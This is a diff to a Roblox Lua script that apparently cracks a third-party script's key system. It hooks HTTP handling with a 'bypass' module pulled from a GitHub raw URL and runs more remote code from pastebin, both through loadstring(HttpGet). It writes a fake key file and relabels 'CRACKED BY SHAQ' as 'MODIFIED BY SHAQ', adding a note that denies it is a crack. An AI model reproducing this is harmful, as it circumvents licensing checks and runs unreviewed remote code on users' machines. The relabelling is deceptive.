@@ -1,3 +1,4 @@
+-- Note: This is not a crack rather we modify how requests are handled in order to properly run the lua code meant for Roblox Studio
 -- https://discord.gg/e3pU7AqWU3 is their discord
 local HttpService = game:GetService("HttpService")
 local bypass = loadstring(game:HttpGet("https://raw.githubusercontent.com/1-16AM/xena/refs/heads/main/functions/hooking.lua"))()
@@ -14,4 +15,4 @@ end)
 writefile('Senju_Key_' .. game.Players.LocalPlayer.Name .. ".txt", "https://discord.gg/VSKCM7rXVY")
 
 loadstring(game:HttpGet("https://pastebin.com/raw/wk11PpEw"))()
--- CRACKED BY SHAQ
+-- MODIFIED BY SHAQ
